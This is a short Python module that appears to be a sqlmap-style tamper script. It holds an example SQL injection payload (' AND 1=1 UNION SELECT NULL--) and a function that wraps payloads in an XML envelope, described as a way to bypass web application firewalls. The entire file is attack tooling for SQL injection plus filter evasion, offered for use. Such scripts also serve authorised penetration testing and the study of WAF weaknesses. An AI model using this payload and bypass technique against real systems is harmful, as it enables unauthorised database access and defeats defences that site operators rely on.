__example_payload__ = "' AND 1=1 UNION SELECT NULL--"
__type__ = "XML encoding to bypass WAF using XML entities"


def tamper(payload, **kwargs):
    retval = '<?xml version="1.0" encoding="UTF-8"?><query>{}</query>'.format(payload)
    return retval
